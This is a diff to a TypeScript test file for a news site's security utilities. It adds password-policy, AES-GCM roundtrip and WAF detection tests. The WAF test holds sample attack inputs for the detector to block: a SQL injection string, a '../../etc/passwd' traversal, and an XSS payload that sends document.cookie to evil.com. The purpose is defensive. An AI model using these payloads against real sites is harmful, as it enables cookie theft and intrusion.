@@ -11,6 +11,11 @@ import {
   recordLoginSuccess,
   getCSRFToken,
   validateCSRFToken,
+  encryptDataAES,
+  decryptDataAES,
+  inspectWAFPayload,
+  isClientBanned,
+  unbanClient,
 } from '../utils/security.ts';
 
 // Mock storage for Node test runner
@@ -51,19 +56,33 @@ test('2. Security Utility — Malicious Protocol & Safe URL Filtering', () => {
   assert.strictEqual(isSafeUrl('vbscript:msgbox("xss")'), false);
 });
 
-test('3. Security Utility — Password Strength Validation', () => {
+test('3. Security Utility — Strict 8+ Char Password with Figures & Specials Policy', () => {
+  // Too short (<8 chars)
   const weak = checkPasswordStrength('12345');
   assert.strictEqual(weak.score <= 1, true);
   assert.strictEqual(weak.passed, false);
   assert.strictEqual(weak.label, 'Weak');
 
-  const medium = checkPasswordStrength('Password123');
-  assert.strictEqual(medium.score >= 2, true);
-  assert.strictEqual(medium.passed, true);
+  // Missing special characters
+  const missingSpecial = checkPasswordStrength('Password123');
+  assert.strictEqual(missingSpecial.criteria.minLength, true);
+  assert.strictEqual(missingSpecial.criteria.hasUppercase, true);
+  assert.strictEqual(missingSpecial.criteria.hasLowercase, true);
+  assert.strictEqual(missingSpecial.criteria.hasNumber, true);
+  assert.strictEqual(missingSpecial.criteria.hasSpecial, false);
+  assert.strictEqual(missingSpecial.passed, false, 'Must fail without special characters');
 
+  // Compliant 8+ chars with upper, lower, number, and special character
+  const compliant = checkPasswordStrength('Password123!');
+  assert.strictEqual(compliant.score >= 3, true);
+  assert.strictEqual(compliant.passed, true, 'Compliant password must pass');
+  assert.strictEqual(compliant.criteria.hasSpecial, true);
+
+  // Maximum entropy enterprise pass
   const strong = checkPasswordStrength('PulseNews!2026Secure#');
-  assert.strictEqual(strong.score >= 3, true);
+  assert.strictEqual(strong.score, 4);
   assert.strictEqual(strong.passed, true);
+  assert.strictEqual(strong.label, 'Strong');
 });
 
 test('4. Security Utility — Rate Limiting & Brute-Force Defense', () => {
@@ -195,4 +214,68 @@ test('9. Zero Emoji Policy in Source Code', () => {
       `File ${f} contains raw unicode emojis which violates the zero-emoji requirement`
     );
   }
+});
+
+test('10. Security Utility — AES-256-GCM Cryptography Roundtrip', async () => {
+  const secretKey = 'Pulse-Enterprise-Key!2026#';
+  const sensitivePayload = JSON.stringify({
+    user: 'commander_chief',
+    secretToken: 'vault-session-xyz-987',
+    clearance: 'admin',
+  });
+
+  const encrypted = await encryptDataAES(sensitivePayload, secretKey);
+  assert.strictEqual(typeof encrypted.ciphertext, 'string');
+  assert.strictEqual(typeof encrypted.iv, 'string');
+  assert.strictEqual(typeof encrypted.tag, 'string');
+  assert.notStrictEqual(encrypted.ciphertext, sensitivePayload, 'Ciphertext must be encrypted');
+
+  const decrypted = await decryptDataAES(encrypted, secretKey);
+  assert.strictEqual(decrypted, sensitivePayload, 'Decrypted plaintext must match original payload exactly');
+});
+
+test('11. Security Utility — Web Application Firewall (WAF) & L7 IDS / IPS Threat Detection', () => {
+  const attackerIp = '198.51.100.42';
+
+  // 1. SQL Injection Payload Detection
+  const sqliResult = inspectWAFPayload("SELECT * FROM users WHERE id = '1' OR '1'='1' --", attackerIp);
+  assert.strictEqual(sqliResult.isBlocked, true, 'SQL injection must be blocked by WAF');
+  assert.strictEqual(sqliResult.incident?.threatType, 'SQL_INJECTION');
+  assert.strictEqual(sqliResult.incident?.ruleId, 'WAF-SQLI-001');
+
+  // Client should now be quarantined
+  const banStatus = isClientBanned(attackerIp);
+  assert.strictEqual(banStatus.banned, true, 'Attacker IP must be placed in quarantine');
+  assert.strictEqual(banStatus.remainingSeconds > 0, true);
+
+  // Subsequent request from quarantined client must be blocked by IP
+  const blockedIpCheck = inspectWAFPayload('hello normal search', attackerIp);
+  assert.strictEqual(blockedIpCheck.isBlocked, true, 'Quarantined IP must be prevented from connecting');
+
+  // Unban client
+  unbanClient(attackerIp);
+  assert.strictEqual(isClientBanned(attackerIp).banned, false);
+
+  // 2. Cross-Site Scripting (XSS) Detection
+  const xssAttackerIp = '198.51.100.43';
+  const xssResult = inspectWAFPayload(
+    '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
+    xssAttackerIp
+  );
+  assert.strictEqual(xssResult.isBlocked, true, 'XSS script injection must be blocked');
+  assert.strictEqual(xssResult.incident?.threatType, 'XSS_ATTACK');
+
+  // 3. Path Traversal Detection
+  const pathAttackerIp = '198.51.100.44';
+  const pathResult = inspectWAFPayload('../../etc/passwd', pathAttackerIp);
+  assert.strictEqual(pathResult.isBlocked, true, 'Directory traversal must be blocked');
+  assert.strictEqual(pathResult.incident?.threatType, 'PATH_TRAVERSAL');
+
+  // 4. Benign Input must pass
+  const cleanUserIp = '198.51.100.50';
+  const benignResult = inspectWAFPayload(
+    'Clean energy revolution and high-speed rail updates in Tokyo',
+    cleanUserIp
+  );
+  assert.strictEqual(benignResult.isBlocked, false, 'Clean journalistic text must be permitted');
 });
